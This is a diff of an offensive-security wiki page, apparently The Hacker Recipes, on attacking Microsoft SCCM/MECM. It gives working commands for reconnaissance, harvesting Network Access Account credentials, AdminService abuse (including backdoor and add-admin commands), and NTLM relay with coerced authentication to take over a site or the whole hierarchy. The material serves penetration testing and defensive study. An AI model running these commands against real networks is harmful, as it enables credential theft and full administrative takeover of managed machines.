@@ -68,6 +68,36 @@ _Nota bene, there is a_ [_feature_](https://learn.microsoft.com/en-us/mem/config
 Enumerate whether SCCM is present in a target network&#x20;
 
 {% tabs %}
+{% tab title="UNIX-like" %}
+[pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy), which is based on [PXEThief](https://github.com/MWR-CyberSec/PXEThief), can be used to query for PXE boot media
+
+<figure><img src="../../.gitbook/assets/SCCM_Recon_Linux_pxethiefy.png" alt=""><figcaption></figcaption></figure>
+
+There are a few things to note
+
+* [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy) uses broadcast requests to request DHCP PXE boot options. An SCCM setup does not have to support PXE boot and a "found" PXE server does not have to be an SCCM component. Be cautious of false positive results.
+* In this case a PXE server was found and PXE media was downloaded. The location of the PXE media on the TFTP server is `\SMSTemp\...`, which indicates that this is indeed an SCCM server.
+
+[sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can also be used to explore the Active Directory and search for SCCM/MECM assets. For this tool, a first user account is required.
+
+```bash
+```
+
+```bash
+#View the SMB configurations and running services
+sccmhunter.py show -smb
+
+#View the users
+sccmhunter.py show -user
+
+#View the servers
+sccmhunter.py show -computers
+
+#View everything
+sccmhunter.py show -all
+```
+{% endtab %}
+
 {% tab title="Windows" %}
 Using LDAP queries from a **domain-joined** Windows machine
 
@@ -89,22 +119,11 @@ PS C:\> .\SharpSCCM.exe local site-info
 
 <figure><img src="../../.gitbook/assets/SCCM_Recon_WMI-SharpSCCM.png" alt=""><figcaption></figcaption></figure>
 {% endtab %}
-
-{% tab title="Linux" %}
-[pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy), which is based on [PXEThief](https://github.com/MWR-CyberSec/PXEThief), can be used to query for PXE boot media:
-
-<figure><img src="../../.gitbook/assets/SCCM_Recon_Linux_pxethiefy.png" alt=""><figcaption></figcaption></figure>
-
-There are a few things to note here:
-
-* [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy) uses broadcast requests to request DHCP PXE boot options. An SCCM setup does not have to support PXE boot and a found PXE server does not have to be an SCCM component. Be cautios of false positive results.
-* In this case a PXE server was found and PXE media was downloaded. The location of the PXE media on the TFTP server is `\SMSTemp\...`, which indicates that this is indeed an SCCM server.
-{% endtab %}
 {% endtabs %}
 
 ### Privilege Escalation
 
-Currently there are two different path ways for privilege escalation routes in an SCCM environment:
+Currently there are two different pathways for privilege escalation routes in an SCCM environment:
 
 * Credential harvesting
 * Authentication Coercion
@@ -122,6 +141,56 @@ The following SCCM components can contain credentials:
 Find more details about these components in [this blog](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) post.
 
 {% tabs %}
+{% tab title="UNIX-based" %}
+From UNIX-like systems, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher the WMI blob via DPAPI and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.
+
+```powershell
+SystemDPAPIdump.py -creds -sccm 'DOMAIN/USER:Password'@'target.domain.local'
+```
+
+**Harvest NAA credentntials**
+
+{% hint style="warning" %}
+The tool author ([Adam Chester](https://twitter.com/\_xpn\_)) warns not to use this script in production environments.
+{% endhint %}
+
+Step 1: Gain control over computer account password
+
+```bash
+$:> python3 impacket/examples/addcomputer.py -dc-ip 10.250.2.200 -computer-name addedcomp1 -computer-pass Ndjqje8341 SafeAlliance.local/Frank.Zapper:b                                                                                               
+Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
+
+[*] Successfully added machine account addedcomp1$ with password Ndjqje8341.
+```
+
+Step 2: Use sccmwtf.py to extract NAA secrets
+
+```bash
+$:> sccmwtf.py <CompAccountNetBiosName> <CompAccountFQDN> <SCCMMPNetBiosName> "<Domain>\<CompAccountName>$" "<CompAccountPassword>"
+## Example
+$:> sccmwtf.py addedcomp1 addedcomp1.SafeAlliance.local SA-SCCM-1 "SafeAlliance\addedcomp1$" "Ndjqje8341"
+```
+
+Step 3: Obtain obfuscated NAA secrets
+
+The obufscated NAA secrets will be saved in a local file
+
+```bash
+$:> cat /tmp/naapolicy.xml
+```
+
+Step 4: Decode obfuscated strings
+
+To decode username and password use `.\DeobfuscateSecretString.exe` contained in [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) or [sccmwtf](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.c)
+
+Alternatively, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) automates all the attack with, or without, an already controlled computer accounts. For this purpose, the `http` module uses the result from the `find` command and enumerates the remote hosts for SCCM/MECM enrollment web services. If it finds one, it performs [Adam Chester](https://twitter.com/\_xpn\_)'s attack for the specified computer account. If no account is already under control, the `-auto` flag can be indicated to create a new computer account.
+
+```bash
+#Create a new computer account and request the policies
+
+```
+{% endtab %}
+
 {% tab title="From Windows" %}
 **Harvest NAA credentials**
 
@@ -173,49 +242,6 @@ PS:> .\SharpSCCM.exe local secrets -m wmi
 ```
 
 <figure><img src="../../.gitbook/assets/SharpSCCM-get-secrets-command.png" alt=""><figcaption></figcaption></figure>
-{% endtab %}
-
-{% tab title="From Linux" %}
-From UNIX-like systems, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher the WMI blob via DPAPI and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.
-
-```powershell
-SystemDPAPIdump.py -creds -sccm 'DOMAIN/USER:Password'@'target.domain.local'
-```
-
-**Harvest NAA credentntials**
-
-{% hint style="warning" %}
-The tool author ([Adam Chester](https://twitter.com/\_xpn\_)) warns not to use this script in production environments.
-{% endhint %}
-
-Step 1: Gain control over computer account password
-
-```bash
-$:> python3 impacket/examples/addcomputer.py -dc-ip 10.250.2.200 -computer-name addedcomp1 -computer-pass Ndjqje8341 SafeAlliance.local/Frank.Zapper:b                                                                                               
-Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
-
-[*] Successfully added machine account addedcomp1$ with password Ndjqje8341.
-```
-
-Step 2: Use sccmwtf.py to extract NAA secrets
-
-```bash
-$:> python3 sccmwtf.py <CompAccountNetBiosName> <CompAccountFQDN> <SCCMMPNetBiosName> "<Domain>\<CompAccountName>$" "<CompAccountPassword>"
-## Example
-$:> python3 sccmwtf.py addedcomp1 addedcomp1.SafeAlliance.local SA-SCCM-1 "SafeAlliance\addedcomp1$" "Ndjqje8341"
-```
-
-Step 3: Obtain obfuscated NAA secrets
-
-The obufscated NAA secrets will be saved in a local file
-
-```bash
-$:> cat /tmp/naapolicy.xml
-```
-
-Step 4: Decode obfuscated strings
-
-To decode username and password use `.\DeobfuscateSecretString.exe` contained in [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) or [sccmwtf](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.c)
 {% endtab %}
 {% endtabs %}
 
@@ -395,6 +421,70 @@ New-CMScriptDeployement -CMDrive 'E' -ServerFQDN 'sccm.domain.local' -TargetDevi
 {% endtab %}
 {% endtabs %}
 
+#### AdminService API
+
+Among all the services offered by SCCM to the administrator, there is one named **CMPivot**. This service, located on the MP server, can enumerate all the resources of a computer or computer collection (installed software, local administrators, hardware specification, etc.), and perform administrative tasks on them. It uses a HTTP REST API, named **AdminService**, provided by the SMS Provider server.
+
+It appears that, with SCCM administrative rights, it is possible to directly interact with the **AdminService** API, without using CMPivot, for post SCCM exploitation purpose.
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+From UNIX-like systems, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used for this purpose.
+
+```bash
+python3 sccmhunter.py admin -u "LAB\USER" -p PASSWORD -ip <site_server_IP>
+```
+
+Then, the `help` command can be typed in the opened shell to view all the CMPivot commands handled by [sccmhunter](https://github.com/garrettfoster13/sccmhunter).
+
+```bash
+() C:\ >> help
+
+Documented commands (use 'help -v' for verbose/'help <topic>' for details):
+
+Database Commands
+=================
+get_collection  get_device  get_lastlogon  get_puser  get_user
+
+Interface Commands
+==================
+exit  interact
+
+PostEx Commands
+===============
+add_admin  backdoor  backup  delete_admin  restore  script
+
+Situational Awareness Commands
+==============================
+administrators  console_users  ipconfig   osinfo    sessions
+cat             disk           list_disk  ps        shares  
+cd              environment    ls         services  software
+```
+{% endtab %}
+
+{% tab title="Windows" %}
+From Windows systems, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be used for this purpose.
+
+**Step 1: retrieve the ID of the resource to enumerate (a computer or a computer collection)**
+
+```powershell
+.\SharpSCCM.exe get resource-id -d "COMPUTER"
+```
+
+**Step 2: execute administrative tasks with CMPivot requests**
+
+```powershell
+#Enumerate the local administrators
+.\SharpSCCM.exe invoke admin-service -r <resource_ID> -q "Administrators" -j
+
+#Enumerate the installed softwares
+.\SharpSCCM.exe invoke admin-service -r <resource_ID> -q "InstalledSoftware" -j
+```
+
+Instructions about how to write CMPivot queries are presented [here](https://learn.microsoft.com/fr-fr/mem/configmgr/core/servers/manage/cmpivot).
+{% endtab %}
+{% endtabs %}
+
 ### SCCM Site Takeover
 
 The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy (See [SCCM Topology](sccm-mecm.md#topology)).&#x20;
@@ -409,11 +499,13 @@ The primary site server's computer account is member of the local Administrators
 >
 > _(source:_ [_Microsoft.com_](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites)_)_
 
-This means that it is possible to obtain administrative access on the site database server by relaying a NTLM authentication coming from the primary site server, for example by coercing an automatic client push installation from it, and granting full access on the SCCM site to a controlled user.
+This means that it is possible to obtain administrative access on the site database server, or interact as a local administrator with the HTTP API on the SMS Provider, by relaying a NTLM authentication coming from the primary site server, for example by coercing an automatic client push installation from it, and granting full access on the SCCM site to a controlled user.
 
 {% hint style="info" %}
-For more details about how this attack works, refer to the article "[SCCM Site Takeover via Automatic Client Push Installation](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)" by [Chris Thompson](https://mobile.twitter.com/\_mayyhem).
+For more details about how these attacks work, refer to the article "[SCCM Site Takeover via Automatic Client Push Installation](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)" by [Chris Thompson](https://mobile.twitter.com/\_mayyhem) for the database attack, and "[Site Takeover via SCCM’s AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)" by [Garrett Foster](https://twitter.com/garrfoster) for the HTTP one.
 {% endhint %}
+
+#### Relay to the MSSQL site database
 
 {% hint style="warning" %}
 Some requirements are needed to perform the attack:&#x20;
@@ -432,9 +524,11 @@ Some requirements are needed to perform the attack:&#x20;
 * knowing the three-character site code for the SCCM site is required (step 3 below)
 * knowing the NetBIOS name, FQDN, or IP address of a site management point is required
 * knowing the NetBIOS name, FQDN, or IP address of the site database server is required
+
+The first four requirements above apply to the [client push installation coercion technique](sccm-mecm.md#client-push-installation). But without them, a regular coercion technique could still be used (petitpotam, printerbug, etc.).
 {% endhint %}
 
-#### 1. Retrieve the controlled user SID&#x20;
+1. Retrieve the controlled user SID&#x20;
 
 The first step consists in retrieving the hexadecimal format of the user's SID (Security IDentifier) to grant "Full Administrator SCCM role" to, on the site database server. The hex formatted SID is needed in a part below: [#4.-obtain-an-sql-console](sccm-mecm.md#4.-obtain-an-sql-console "mention").
 
@@ -474,9 +568,9 @@ From Windows systems, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can
 {% endtab %}
 {% endtabs %}
 
-#### 2. Setup NTLM relay server
+2. Setup NTLM relay server
 
-The target of the [NTLM relay attack](broken-reference) must be set to the site database server, either on the MS-SQL (port `1433/tcp`), or SMB service (port `445/tcp`) if the relayed user has admin privileges on the target. The rest of this page is focusing on relaying the authentication on the MS-SQL service.
+The target of the [NTLM relay attack](ntlm/relay.md) must be set to the site database server, either on the MS-SQL (port `1433/tcp`), or SMB service (port `445/tcp`) if the relayed user has admin privileges on the target. The rest of this page is focusing on relaying the authentication on the MS-SQL service.
 
 {% tabs %}
 {% tab title="UNIX-like" %}
@@ -496,9 +590,9 @@ From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh
 {% endtab %}
 {% endtabs %}
 
-Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [Broken link](broken-reference "mention").&#x20;
+Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](ntlm/relay.md).
 
-#### 3. Authentication coercion
+3. Authentication coercion
 
 The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/\_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](print-spooler-service/printerbug.md), [PetitPotam](mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](mitm-and-coerced-authentications/ms-dfsnm.md), etc.).
 
@@ -520,7 +614,7 @@ There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` 
 
 The rest of this page is focusing on relaying the authentication on the MS-SQL service.
 
-#### 4. Obtain an SQL console
+4. Obtain an SQL console
 
 If the NTLM relay attack is a success and was targeting the MS-SQL service with SOCKS support, an SQL console could be obtained on the SCCM database through the opened socks proxy. From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (Python) can be used for that purpose.
 
@@ -549,15 +643,82 @@ Once the console is obtained, the attack can proceed to granting the user full p
 
 It is then possible to verify the new privileges on SCCM.
 
-<pre><code># this should be run on the windows SCCM client as the user that was just given full administrative role to 
+<pre class="language-powershell"><code class="lang-powershell"># this should be run on the windows SCCM client as the user that was just given full administrative role to 
 <strong>.\SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "&#x3C;site_code>"
 </strong></code></pre>
+
+Post exploitation via SCCM can now be performed on the network.
+
+#### Relay to the HTTP API AdminService
+
+{% hint style="warning" %}
+Some requirements are needed to perform the attack:
+
+* The HTTP API for the **AdminService** service is reachable on the SMS Provider server
+* knowing the NetBIOS name, FQDN, or IP address of a site management point is required
+* knowing the NetBIOS name, FQDN, or IP address of the site SMS provider server is required
+{% endhint %}
+
+1. Setup an NTLM relay server
+
+The target of the [NTLM relay attack](ntlm/relay.md) must be set to the SMS Provider server, on the HTTP/S service (port `80/tcp` or `443/tcp`).
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+From UNIX-like systems, [this PR](https://github.com/fortra/impacket/pull/1593) on [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.
+
+```bash
+ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid <USER_SID>
+```
+{% endtab %}
+
+{% tab title="Windows" %}
+From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it doesn't feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
+{% endtab %}
+{% endtabs %}
+
+Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](ntlm/relay.md).
+
+2. Authentication coercion
+
+The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/\_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](print-spooler-service/printerbug.md), [PetitPotam](mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](mitm-and-coerced-authentications/ms-dfsnm.md), etc.).
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+From UNIX-like systems, authentication can be coerced through [PrinterBug](print-spooler-service/printerbug.md), [PetitPotam](mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](mitm-and-coerced-authentications/ms-dfsnm.md), etc. (not based on triggering the client push installation).
+
+There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).
+{% endtab %}
+
+{% tab title="Windows" %}
+```powershell
+.\SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "<site_code>" -t "attacker.domain.local"
+```
+{% endtab %}
+{% endtabs %}
+
+If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the sms provider server, the controlled should be now a SCCM site admin.
+
+It is then possible to verify the new privileges on SCCM.
+
+```powershell
+# this should be run on the windows SCCM client as the user that was just given full administrative role to 
+.\SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "<site_code>"
+```
 
 Post exploitation via SCCM can now be performed on the network.
 
 {% hint style="warning" %}
 The tool author ([Chris Thompson](https://mobile.twitter.com/\_mayyhem)) warns that [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) is a PoC only tested in lab. One should be careful when running in production environments.&#x20;
 {% endhint %}
+
+### SCCM Hierarchy takeover
+
+In really big environments that host multiple SCCM sites (think about a big company, with one SCCM site per continent), it is possible to encounter a **Central Administration Site (CAS)**. This type of site allows to manage all the primary sites from one point, make some reporting, and is totally optional.
+
+As indicated by [Chris Thompson](https://mobile.twitter.com/\_mayyhem) in his article [SCCM Hierarchy Takeover](https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087), by default, when a new user is promoted to any SCCM administrative role on a primary site server (for example, `Full Administrator`), **the role is automatically propagated to the other SCCM site in the hierarchy by the CAS**.
+
+This means that there is no security boundary between SCCM sites in a same hierarchy, and being able to takeover one SCCM site implicates to takeover all the others.
 
 ## Resources
 
@@ -586,3 +747,7 @@ The tool author ([Chris Thompson](https://mobile.twitter.com/\_mayyhem)) warns t
 {% embed url="https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1" %}
 
 {% embed url="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a" %}
+
+{% embed url="https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf" %}
+
+{% embed url="https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087" %}
